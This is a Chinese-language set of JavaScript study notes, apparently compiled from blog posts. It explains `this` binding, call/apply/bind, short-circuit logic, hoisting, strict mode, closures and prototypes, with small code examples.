​	![image-20201226173919574](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210328145436.png)

![image-20201226174006080](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210328145440.png)

`在class类中this都指向新创建的实例对象，如果不加this去调用方法和属性，那么就会去全局作用域找，找不到就会报错`

正确的写法是：

```
    class Star {
    constructor(uname,age){
      this.uname = uname
      this.age = age
      this.sing()
    }
    sing(){
      console.log(this.uname); //刘德华
    }
  }
  let ldh = new Star ('刘德华')
  ldh.sing()
```

结果：

​	![image-20201226174313157](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210328145458.png)



##### call、apply、bind

> call()、apply()、bind()是用来改变this的指向的。

![img](https://www.runoob.com/wp-content/uploads/2018/08/1535346409-8618-20170316165541854-1574871496.png)

```
     obj.objAge;  // 17
     obj.m yFun()  // 小张年龄 undefined
```

![img](https://www.runoob.com/wp-content/uploads/2018/08/1535346409-8327-20170316170324541-406227186.png)

```
	shows()  // 盲僧　
```

比较一下这两者 this 的差别，第一个打印里面的 this 指向 obj，第二个全局声明的 shows() 函数 this 是 window ；

由于this只能存在于window对象和方法中，第一this并没有方法包裹，所以作用域是指向全局window,所以这时this指向window

**1，call()、apply()、bind() 都是用来重定义 this 这个对象的！**

![img](https://www.runoob.com/wp-content/uploads/2018/08/1535346409-8172-20170316172537651-1643313633.png)

```
     obj.myFun.call(db)；　　　　// 德玛年龄 99
     obj.myFun.apply(db);　　　 // 德玛年龄 99
     obj.myFun.bind(db)();　　　// 德玛年龄 99
```

以上除了 bind 方法后面多了个 () 外 ，结果返回都一致！

由此得出结论，bind 返回的是一个新的函数，你必须调用它才会被执行。

**2，对比call 、bind 、 apply 传参情况下**

![img](https://www.runoob.com/wp-content/uploads/2018/08/1535346409-7922-20170316173631526-1279562612.png)

```
obj.myFun.call(db,'成都','上海')；　　　　 // 德玛 年龄 99  来自 成都去往上海
obj.myFun.apply(db,['成都','上海']);      // 德玛 年龄 99  来自 成都去往上海  
obj.myFun.bind(db,'成都','上海')();       // 德玛 年龄 99  来自 成都去往上海
obj.myFun.bind(db,['成都','上海'])();　　 // 德玛 年龄 99  来自 成都, 上海去往 undefined
```

微妙的差距！

从上面四个结果不难看出:

call 、bind 、 apply 这三个函数的第一个参数都是 this 的指向对象，第二个参数差别就来了：

call 的参数是直接放进去的，第二第三第 n 个参数全都用逗号分隔，直接放到后面 **obj.myFun.call(db,'成都', ... ,'string' )**。

apply 的所有参数都必须放在一个数组里面传进去 **obj.myFun.apply(db,['成都', ..., 'string' ])**。

bind 除了返回是函数以外，它 的参数和 call 一样。

当然，三者的参数不限定是 string 类型，允许是各种类型，包括函数 、 object 等等！

##### 逻辑运算符（与或非）

**1、非！**

> ​	所谓非，就是取反，非真即假，非假即真。

​	非运算符不仅仅只能用于布尔值，其他数据类型也是可以的，如下:

​	1.如果操作数是一个对象，返回false

​	2.如果操作数是一个空字符串，返回true

​	3.如果操作数是一个非空字符串，返回false

​	4.如果操作数是数值0，返回true

​	5.如果操作数是任意非0数值(包括Infinity), 返回false

​	6.如果操作数是null,返回true

​	7.如果操作数是NaN,返回true

​	8.如果操作数是undefined, 返回true

**2、与&&**

> ​	作用于两到多个值，并且只有所有的操作数都是真值时，才为true。

​	JavaScript里面的与存在短路现象，具体说明如下:

​	1.第一个操作数为真:会进入第二个操作数的判断，且无论第二个操作数真假，都会返回第二个操作数。

​	2.第一个操作数为假:不会进入第二个操作数的判断，直接返回第一个操作数。

```
     console.log(3 && 5);//5
     console.log("Hello" && 20);//20
     console.log("Hello" && false);//false
     console.log("" && "shoe");//""
     console.log("Hello" && '');//''
```

**3、或||**

> 同样是作用于两到多个值，但是只要有一个操作数为真，就返回真。

JavaScript里面的或同样存在短路现象，具体说明如下:

1.如果第一个操作数为真，则不会进入第二个数的判断。所以无论第二个操作数真假，都直接返回第一个操作数

2.如果第一个操作数为假，则会进入第二个数的判断。但是无论第二个操作数真假，都直接返回第二个操作数

实例：

```
	console.log(false || true);//true
     console.log("Hello" || "");//Hello
     console.log("Hello" || "str");//Hello
     console.log(NaN || "");//""
     console.log(0 || "Hello World");//Hello World
     console.log('' || 'str');//str
     console.log('' || false);//false
```

经典题：

```
     let a = false;
     let b = a || c;因为a是false，所以会判断第二个数。
     console.log(b); //ReferenceError: c is not defined
     let a = false;
     let b = a && c;// 因为a是false，所以不会判断第二个数。
     console.log(b);//false
```

##### 作用域

###### 变量声明提前

-使用var关键字声明的变量，会在所有的代码执行之前被声明

var a=1相当于在代码最上方提前声明a；也就是var a;后面再赋值

-但是如果声明变量时`不使用var关键字，则变量不会被声明提前`

```
 	console.log(a); //undefined
     var a = 10
```

```
    console.log(a); //报错，let和const声明的变量都不会声明提前
    let a = 10
```

```
    console.log(a);//报错
    const a = 10
```

```
    console.log(a);//报错
    a = 10
```

###### 函数声明提前

**function fun(){}与var fun2=function(){}的区别**

函数声明提前

　　-使用函数声明形式创建的函数function 函数名（）{}

```
    console.log(a); //a(){}
    function a() {}
```

它会在所有的代码执行之前就被创建，`函数声明提前会在变量提升之后,变量提升会快于函数提升`

```
    console.log(a); //a(){}
    function a() {}
    var a = 10
    //上面代码在js中是这样解析的
    //var a;
    //function a(){}
    //console.log(a) //a(){}
    //a = 10
```

-使用函数表达式创建的函数不会声明提前（但是会变量提升，不会报错），所以不能在声明前调用

　　　　如果提前使用的话相当于undefined

```
    console.log(a); //undefined,不会函数提升
    var a = function () {}
```

##### 严格模式

**一、概述**

除了正常运行模式，ECMAscript 5添加了第二种运行模式：["严格模式"](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Functions_and_function_scope/Strict_mode)（strict mode）。顾名思义，这种模式使得Javascript在更严格的条件下运行。

![img](http://www.ruanyifeng.com/blogimg/asset/201301/bg2013011401.jpg)

设立"严格模式"的目的，主要有以下几个：

> 　　- 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;
>
> 　　- 消除代码运行的一些不安全之处，保证代码运行的安全；
>
> 　　- 提高编译器效率，增加运行速度；
>
> 　　- 为未来新版本的Javascript做好铺垫。

"严格模式"体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经[支持](http://kangax.github.com/es5-compat-table)它，许多大项目已经开始全面拥抱它。

另一方面，同样的代码，在"严格模式"中，可能会有不一样的运行结果；一些在"正常模式"下可以运行的语句，在"严格模式"下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。

本文将对"严格模式"做详细介绍。

**二、进入标志**

进入"严格模式"的标志，是下面这行语句：

> 　　"use strict";

老版本的浏览器会把它当作一行普通字符串，加以忽略。

**三、如何调用**

"严格模式"有两种调用方法，适用于不同的场合。

**3.1 针对整个脚本文件**

将"use strict"放在脚本文件的第一行，则整个脚本都将以"严格模式"运行。如果这行语句不在第一行，则无效，整个脚本以"正常模式"运行。如果不同模式的代码文件合并成一个文件，这一点需要特别注意。

(严格地说，只要前面不是产生实际运行结果的语句，"use strict"可以不在第一行，比如直接跟在一个空的分号后面。)

> 　　<script>　　　　
>        "use strict";　　　
>
> 　	console.log("这是严格模式。");　
>
> 　　<script>　　　　
>
> </script>
>
>    console.log("这是正常模式。");　
>
> </script>

上面的代码表示，一个网页中依次有两段Javascript代码。前一个script标签是严格模式，后一个不是。

**3.2 针对单个函数**

将"use strict"放在函数体的第一行，则整个函数以"严格模式"运行。

> 　　function strict(){
> 　　　　"use strict";
> 　　　　return "这是严格模式。";
> 　　}
>
> 　　function notStrict() {
> 　　　　return "这是正常模式。";
> 　　}

**3.3 脚本文件的变通写法**

因为第一种调用方法不利于文件合并，所以更好的做法是，借用第二种方法，将整个脚本文件放在一个立即执行的匿名函数之中。

> 　　(function (){
>
> 　　　　"use strict";
>
> 　　　　// some code here
>
> 　　 })();

**四、语法和行为改变**

严格模式对Javascript的语法和行为，都做了一些改变。

**4.1 全局变量显式声明**

在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。

> "use strict";
>
> 　　v = 1; // 报错，v未声明
>
> 　　for(i = 0; i < 2; i++) { // 报错，i未声明
> 　　}

因此，严格模式下，变量都必须先用var命令声明，然后再使用。

**4.2 静态绑定**

Javascript语言的一个特点，就是允许"动态绑定"，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。

严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。

具体来说，涉及以下几个方面。

**（1）禁止使用with语句**

因为with语句无法在编译时就确定，属性到底归属哪个对象。

> 　　"use strict";
>
> 　　var v = 1;
>
> 　　with (o){ // 语法错误
> 　　　　v = 2;
> 　　}

**（2）创设eval作用域**

正常模式下，Javascript语言有两种变量作用域（scope）：全局作用域和函数作用域。严格模式创设了第三种作用域：eval作用域。

正常模式下，eval语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于eval内部。

> 　　"use strict";
>
> 　　var x = 2;
>
> 　　console.info(eval("var x = 5; x")); // 5
>
> 　　console.info(x); // 2

**4.3 增强的安全措施**

**（1）禁止this关键字指向全局对象**

> 　　function f(){
> 　　　　return !this;
> 　　}
> 　　// 返回false，因为"this"指向全局对象，"!this"就是false
>
> 　　function f(){
> 　　　　"use strict";
> 　　　　return !this;
> 　　}
> 　　// 返回true，因为严格模式下，this的值为undefined，所以"!this"为true。

因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错。

> 　　function f(){
>
> 　　　　"use strict";
>
> 　　　　this.a = 1;
>
> 　　};
>
> 　　f();// 报错，this未定义

**（2）禁止在函数内部遍历调用栈**

> 　　function f1(){
>
> 　　　　"use strict";
>
> 　　　　f1.caller; // 报错
>
> 　　　　f1.arguments; // 报错
>
> 　　}
>
> 　　f1();

**4.4 禁止删除变量**

严格模式下无法删除变量。只有configurable设置为true的对象属性，才能被删除。

> 　　"use strict";
>
> 　　var x;
>
> 　　delete x; // 语法错误
>
> 　　var o = Object.create(null, {'x': {
> 　　　　　　value: 1,
> 　　　　　　configurable: true
> 　　}});
>
> 　　delete o.x; // 删除成功

**4.5 显式报错**

正常模式下，对一个对象的只读属性进行赋值，不会报错，只会默默地失败。严格模式下，将报错。

> 　　"use strict";
>
> 　　var o = {};
>
> 　　Object.defineProperty(o, "v", { value: 1, writable: false });
>
> 　　o.v = 2; // 报错

严格模式下，对一个使用getter方法读取的属性进行赋值，会报错。

> 　　"use strict";
>
> 　　var o = {
>
> 　　　　get v() { return 1; }
>
> 　　};
>
> 　　o.v = 2; // 报错

严格模式下，对禁止扩展的对象添加新属性，会报错。

> 　　"use strict";
>
> 　　var o = {};
>
> 　　Object.preventExtensions(o);
>
> 　　o.v = 1; // 报错

严格模式下，删除一个不可删除的属性，会报错。

> 　　"use strict";
>
> 　　delete Object.prototype; // 报错

**4.6 重名错误**

严格模式新增了一些语法错误。

**（1）对象不能有重名的属性**

正常模式下，如果对象有多个重名属性，最后赋值的那个属性会覆盖前面的值。严格模式下，这属于语法错误。

> 　　"use strict";
>
> 　　var o = {
> 　　　　p: 1,
> 　　　　p: 2
> 　　}; // 语法错误



**（2）函数不能有重名的参数**

正常模式下，如果函数有多个重名的参数，可以用arguments[i]读取。严格模式下，这属于语法错误。

> 　　"use strict";
>
> 　　function f(a, a, b) { // 语法错误
>
> 　　　　return ;
>
> 　　}

**4.7 禁止八进制表示法**

正常模式下，整数的第一位如果是0，表示这是八进制数，比如0100等于十进制的64。严格模式禁止这种表示法，整数第一位为0，将报错。

> 　　"use strict";
>
> 　　var n = 0100; // 语法错误

**4.8 arguments对象的限制**

arguments是函数的参数对象，严格模式对它的使用做了限制。

**（1）不允许对arguments赋值**

> 　　"use strict";
>
> 　　arguments++; // 语法错误
>
> 　　var obj = { set p(arguments) { } }; // 语法错误
>
> 　　try { } catch (arguments) { } // 语法错误
>
> 　　function arguments() { } // 语法错误
>
> 　　var f = new Function("arguments", "'use strict'; return 17;"); // 语法错误

**（2）arguments不再追踪参数的变化**

> 　　function f(a) {
>
> 　　　　a = 2;
>
> 　　　　return [a, arguments[0]];
>
> 　　}
>
> 　　f(1); // 正常模式为[2,2]
>
> 　　function f(a) {
>
> 　　　　"use strict";
>
> 　　　　a = 2;
>
> 　　　　return [a, arguments[0]];
>
> 　　}
>
> 　　f(1); // 严格模式为[2,1]

**（3）禁止使用arguments.callee**

这意味着，你无法在匿名函数内部调用自身了。

> 　　"use strict";
>
> 　　var f = function() { return arguments.callee; };
>
> 　　f(); // 报错

**4.9 函数必须声明在顶层**

将来Javascript的新版本会引入"块级作用域"。为了与新版本接轨，严格模式只允许在全局作用域或函数作用域的顶层声明函数。也就是说，不允许在非函数的代码块内声明函数。

> 　　"use strict";
>
> 　　if (true) {
>
> 　　　　function f() { } // 语法错误
>
> 　　}
>
> 　　for (var i = 0; i < 5; i++) {
>
> 　　　　function f2() { } // 语法错误
>
> 　　}

**4.10 保留字**

为了向将来Javascript的新版本过渡，严格模式新增了一些保留字：implements, interface, let, package, private, protected, public, static, yield。

使用这些词作为变量名将会报错。

> 　　function package(protected) { // 语法错误
>
> 　　　　"use strict";
>
> 　　　　var implements; // 语法错误
>
> 　　}

此外，ECMAscript第五版本身还规定了另一些保留字（class, enum, export, extends, import, super），以及各大浏览器自行增加的const保留字，也是不能作为变量名的。

##### this

> this是一个对象的别名，它指向一个对象，对象没有作用域，作用域与函数对应，this和对象对应

###### 普通函数的this指向

在普通函数中，谁调用它，this就指向它

**1.函数调用模式**

当一个函数并非一个对象的属性时，那么它就是被当做函数来调用的。在此种模式下，this被绑定为全局对象，在浏览器环境下就是window对象

![img](https://img-blog.csdn.net/20171002123510524?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

**2.方法调用模式**

当函数被保存为一个对象的属性时，它就可称为这个对象的方法。当一个方法被调用时，this被绑定到这个对象上。如果调用表达式包含一个提取属性的动作（. 或 []），那么它被称为方法调用

![img](https://img-blog.csdn.net/20171002123553864?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

这里的this指向的对象是o，因为调用这个sayName()函数是通过o.sayName()执行的。

![img](https://img-blog.csdn.net/20171002123750147?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

因为是o.b调用的这个函数，所以指向b这个对象

![img](https://img-blog.csdn.net/20171002123841483?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

同理，因为是o.b调用的这个函数，所以指向b这个对象

![img](https://img-blog.csdn.net/20171002123856888?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

t是全局变量，在全局环境下执行，this指向window

**3.构造函数调用模式**

如果在一个函数前面加上new关键字来调用，那么就会创建一个连接到该函数的prototype成员的新对象，同时，this会被绑定到这个新对象上。这种情况下，这个函数就可以成为此对象的构造函数。

![img](https://img-blog.csdn.net/20171002123927881?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

在构造函数，new出一个对象时，this指向这个构造函数，new关键字会改变this的指向

![img](https://img-blog.csdn.net/20171002123959469?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

当用new关键字，返回的是一个对象，this指向的就是那个返回的对象；

如果返回的不是对象，this还是指向函数的实例，虽然null属于对象，但是返回null依然指向函数实例

![img](https://img-blog.csdn.net/20171002124026509?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

![img](https://img-blog.csdn.net/20171002124054904?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

![img](https://img-blog.csdn.net/20171002124108493?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

![img](https://img-blog.csdn.net/20171002124139423?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

![img](https://img-blog.csdn.net/20171002124150542?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

![img](https://img-blog.csdn.net/20171002124211762?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

**4.apply和call调用模式**

JS中，函数也是对象，所有函数对象都有两个方法：apply和call，这两个方法可以让我们构建一个参数数组传递给调用函数，也允许我们改变this的值

![img](https://img-blog.csdn.net/20171002124236144?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

在全局范围内，this指向全局对象（浏览器下指window对象）

对象函数调用时，this指向当前对象

全局函数调用时，应该是指向调用全局函数的对象。

使用new关键字实例化对象时，this指向新创建的对象

当用apply和call上下文调用的时候指向传入的第一个参数

**练习题**

![img](https://img-blog.csdn.net/20171002124257732?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

在执行person1.sayName()时，时方法调用模式，this代表person1这个对象

在执行person2.sayName()时，时方法调用，但是sayName，并没有执行，而是将sayName()这个函数赋值给fun这个变量，fun是函数调用模式，this指向window，故输出全局的name

![img](https://img-blog.csdn.net/20171002124311867?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

执行console.log(b.n)时，b对象有自己的属性n值

执行console.log(c.n)时，c对象没有自己的属性n值，会向上查找，找的A对象中的属性n值

![img](https://img-blog.csdn.net/20171002124329433?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZm9yZXZlcnd5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

vargetColor=test.getColor相当于把方法函数赋值给全局变量，

故getColor()中的this指向window

test.getColor()是方法调用

注：`原型对象里面的方法的this指向实例`

###### 箭头函数的this指向

`箭头函数中没有this,所以它会往上一层去找，如果都没有找到，this就指向window对象，如果找到，那么就找到的this作为自己的this`,`并且call、apply、bind都不能改变它的this指向，因为箭头函数根本没有this`

注意：作用域是对于函数来说的

箭头函数的this指向取决于该函数`定义时`所在的作用域，它会捕获其所在（即定义的位置，也就是该作用域所处的对象）上下文（所处作用域的this）的this值， 作为自己的this值

例：

```
 let obj = {
      name: 'mike',
      fun : function () {
        console.log(this.name); //mike
        return ()=>{
          console.log(this.name); //mike
        }
      }
    }
    obj.fun()() 
```

```
 var name = 'window'
    let obj = {
      name: 'mike',
      fun : ()=>{
        console.log(this.name); //window
      }
    }
    obj.fun()
```

上面第一个例子的箭头函数定义在obj对象的一个方法内，这个方法是有作用域的，而且这个作用域处于obj对象内，所以箭头函数会指向obj对象，

第二个例子，虽然这个箭头函数定义在obj对象中，但是对象是没有作用域的，然后会往下一层找，找到了window,所以this指向了window对象

`如果箭头函数定义在构造函数或者类中，由于箭头函数没有this,那么就会往上找，找到构造函数的this,而构造函数的this为新new的实例，所以箭头函数的`

`this指向实例对象`

```
	function Demo(a) {
           this.a=a
           let arrow = ()=>{
             console.log(this);   //Demo {a: "test"}实例
           }
           let fun = function () {
             console.log(this);  //window对象
           }
           arrow()
           fun()
         }
    new Demo('test')
```

注：箭头函数没有this,箭头函数的this会去它的上级作用域`(注意,刚开始普通函数是没有this的,只有调用的时候才有this,除非使用bind绑定this)`寻找this作为它的this,如果想要该变箭头函数的this,只能通过改变它上级作用域的this,而不能通过call、apply等直接改变箭头函数的指向

###### 回调函数的this指向

首先先说下正常的 this 指向问题

什么是 this：自动引用正在调用当前方法的.前的对象。

this指向的三种情况

1. obj.fun()   fun 中的 this->obj ，自动指向.前的对象

2. new Fun()  Fun 中的 this->正在创建的新对象，new 改变了函数内部的 this 指向，导致 this 指向实例化 new 的对象

3. fun() 和匿名函数自调  this 默认->window，函数内部的 this，this 默认是指向 window 的

再说回调函数中的 this 指向问题，我们先来看一个例子

```
<script>
    var Bob={
        sname:"鲍勃",
        friends:["Jack","Rose","Tom","Jerry"],
        intr(){
          this.friends.forEach(function(ele){
               console.log(this.name+"认识"+ele);
          });
        }
    }
    Bob.intr();
</script>
```

看结果：

undefined认识Jack
		undefined认识Rose
	   undefined认识Tom
	    undefined认识Jerry

forEach中的回调函数中的this默认是指向window的，因为本质上是在函数内callback,并没有 . 前的对象调用，当然我们必须要看这个函数是如何处理这个回调函数的，如果在函数内部再把这个回调函数赋值给新对象的

属性，然后再调用，那么就不是window了，在严格模式下（vue默认开启严格模式）， this为undefined

如何解决：

使用箭头函数

```
     <script>
         var Bob={
             sname:"鲍勃",
             friends:["Jack","Rose","Tom","Jerry"],
             intr(){
               this.friends.forEach(ele=>{
                    console.log(this.sname+"认识"+ele);
               });
             }
         }
         Bob.intr();
     </script>
```

结果是：

鲍勃认识Jack
	  鲍勃认识Rose
	  鲍勃认识Tom
	  鲍勃认识Jerry

可以看出箭头函数内的this自动指向了回调函数外层的 this 。

箭头函数中的 this:

　　函数体内的 this 对象，就是定义时所在的作用域的this，而不是使用时所在的对象。

　　this 指向的固定化，并不是因为箭头函数内部有绑定 this 的机制，实际原因是箭头函数根本没有自己的 this，导致内部的 this 就是外层代码块的 this。正是因为它没有 this，所以也就不能用作构造函数。

普通函数也可使用bind永久绑定this

```
var Bob={
        sname:"鲍勃",
        friends:["Jack","Rose","Tom","Jerry"],
        intr(){
          this.friends.forEach(function(friend){
               console.log(this.sname+"认识"+friend);
          }.bind(this));
        }
    }
    Bob.intr();
```

##### 闭包

> 闭包并不是js自带的内容，闭包的产生是为了解决外层作用域无法获取内层作用域变量等作用域问题

那么闭包到底是什么呢？

我们首先知道闭包有3个特性：

①函数嵌套函数

②函数内部可以引用函数外部的参数和变量

③参数和变量不会被垃圾回收机制回收

**闭包本质就是一个函数里面再定义一个函数，内层函数引用外层函数定义的变量，这样就可以解决许多问题。**

**问题一（外部作用域无法访问内部作用域的问题）**

​		内层函数使用return函数返回

​		<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215648.png" alt="image-20201221114726294" style="zoom:67%;" />

​		在这段代码中，a()中的返回值是一个匿名函数，这个函数在a()作用域内部，所以它可以获取a()作用域下变量name的值，将这个值作为返回值赋给全局作用域下的变量b,实现了在全局变量下获取到局部变量中的变量的值

​		这样就可以访问其他函数定义的变量了，当然我们一定会有这样一个疑问：为什么不直接return 有name,而是使用一个匿名函数包裹返回？

​		直接return的确是可以的，但是获取到的变量与那个函数的变量就无关了，如果使用闭包获取到

​		的函数，那么仍然是使用返回函数的作用域，这样就可以延长函数作用域的作用周期

再来看一个闭包的经典例子

 <img src="https://img2018.cnblogs.com/blog/551750/201812/551750-20181212101629347-1385426172.jpg" alt="img" style="zoom: 80%;" />

一般情况下，在函数fn执行完后，就应该连同它里面的变量一同被销毁，但是在这个例子中，匿名函数作为fn的返回值被赋值给了fn1，这时候相当于fn1=function(){var n = 0 ... }，并且匿名函数内部引用着fn里的变量num，所以变量num无法被销毁，而变量n是每次被调用时新创建的，所以每次		fn1执行完后它就把属于自己的变量连同自己一起销毁，于是乎最后就剩下孤零零的num，于是这里		就产生了内存消耗的问题



**问题二、（异步函数问题）**

写一个for循环，让它按顺序打印出当前循环次数

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215653.png" alt="image-20201221124224881" style="zoom:80%;" />

按照预期它应该依次输出1 2 3 4 5，而结果它输出了五次5，这是为什么呢？原来由于js是单线程的， 所以在执行for循环的时候定时器setTimeout被安排到任务队列中排队等待执行，而在等待过程中for	  循环就已经在执行，等到setTimeout可以执行的时候，for循环已经结束，i的值（函数内部没有该变量，所以只能到外部变量寻找，而这是的外部变量i已经变为5了）也已经变成5，所以打印出来五个5，那么我们为了实现预期结果应该怎么改这段代码呢？（ps:如果把for循环里面的var变成let，也能实现预期结果）

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215658.png" alt="image-20201221125001618" style="zoom:80%;" />

在这段代码中，相当于同时启动5个定时器，i*100是为5个定时器分别设置了不同的时间，同时启动， 	  但是执行时间不同，每个定时器间隔都是100毫秒，实现了每隔100毫秒就执行一次打印的效果。由于

每个for循环生成了5个独立的函数作用域，然后再把每次循环的变量通过参数传进来，而且每个函数的都有独立的作用域，所以函数内部会优先引用函数作用域的变量

**经典题目：闭包作为参数传递**

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215702.png" alt="image-20201221133117212" style="zoom: 80%;" />

在这段代码中，函数fn1作为参数传入立即执行函数中，在执行到fn2(30)的时候，30作为参数传入fn1中，这时候if(x>num)中的num取的并不是立即执行函数中的num，而是取`创建函数的作用域中的num这里函数创建的作用域是全局作用域下`，所以`num取的是全局作用域中的值15`，即30>15，打印30

 原因：虽然看起来fn1是在立即执行函数的作用域里面，但实际上并不是，这里只是调用，fn1仍然处于全局内，所以num还是会去全局中很早，而不会在立即执行函数中找

最后总结一下闭包的好处与坏处

**好处**

①保护函数内的变量安全 ，实现封装，防止变量流入其他环境发生命名冲突

②在内存中维持一个变量，可以做缓存（但使用多了同时也是一项缺点，消耗内存）

③匿名自执行函数可以减少内存消耗

**坏处**

①其中一点上面已经有体现了，就是被引用的私有变量不能被销毁，增大了内存消耗，造成内存泄漏，解决方法是可以在使用完变量后手动为它赋值为null；

②其次由于闭包涉及跨域访问，所以会导致性能损失，我们可以通过把跨作用域变量存储在局部变量中，然后直接访问局部变量，来减轻对执行速度的影响

**使用在单例模式上**

```
	//使用闭包进行改造
    var createSingle = (function () {
      var _unique = null
      return function () {
        if (_unique === null) {
          _unique = {a: 1}
        }
        return _unique
      }
    })()

    var a = createSingle()
    var b = createSingle()
    console.log(a === b);  //true
```



##### 原型链

###### ㈠原型 Prototype

**⑴我们所创建的每一个函数，解析器都会向函数中添加一个属性Prototype**

  		这个属性对应着一个对象，这个对象就是我们所谓的原型对象

**⑵如果函数作为普通函数调用prototype没有任何作用**

  		当函数以构造函数的形式调用时，它所创建的对象中都会有一个隐含的属性
  	
  		指向该构造函数的原型对象，我们可以通过_ _proto_ _来访问

**⑶示例：**

```
     function MyClass(){
     }
     var mc = new MyClass();
     var mc2 = new MyClass();
     console.log(mc2.__proto__ == MyClass.prototype);
```

返回结果为：true；

**⑷原型对象就相当于一个公共的区域，所有同一类的实例都可以访问到这个原型对象**

  我们可以将对象中共有的内容，统一设置到原型对象中。

**⑸当我们访问对象的一个属性或方法时，它会先在对象自身中寻找，如果有则直接使用，**

  如果没有则会去原型对象中寻找，如果找到则直接使用（！important）

**⑹具体图形演示：**

***\*![img](https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200912145335868-1772910806.png)

 **示例1：**

```
     function MyClass(){}//向MyClass的原型中中添加a属性
     MyClass.prototype.a = 123; 
     var mc = new MyClass(); 
     var mc2 = new MyClass(); 
     //向mc中添加a属性  
     mc.a = "我是mc中的a"; 
     console.log(mc.a);
     console.log(mc2.a);
     结果输出：
```

![img](https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200912150836365-1277022884.png) 

**示例2：**

```
     function MyClass(){}//向MyClass的原型中中添加a属性
     MyClass.prototype.a = 123; 
     //向MyClass的原型中中添加一个方法
     MyClass.prototype.sayHello = function(){
          alert("hello");
     };
     var mc = new MyClass(); 
     var mc2 = new MyClass(); 
     //向mc中添加a属性  
     mc.a = "我是mc中的a"; 
     mc.sayHello();
```

 结果显示为：hello

**⑺以后我们创建构造函数时，可以将这些对象共有属性和方法，统一添加到构造函数的原型对象中，**

   这样不用分别为每一个对象添加，也不会影响到全局作用域，就可以使每个对象都具有这些属性和方法了

 

###### ㈡显示原型与隐式原型

```
     function MyClass(){}
     //向MyClass的原型中添加一个name属性
     MyClass.prototype.name = "我是原型中的名字";
     var mc = new MyClass();
     console.log(mc.name);结果返回：我是原型中的名字
```

**⑴使用in检查对象中是否含有某个属性时，如果对象中没有但是原型中有，也会返回true**

  	console.log("name" in mc);
  	
  	 结果会返回:true

**⑵可以使用对象的hasOwnPrototype( )来检查对象自身是否含有该属性**

  	使用该方法只有当对象自身含有属性时，才会返回true
  	
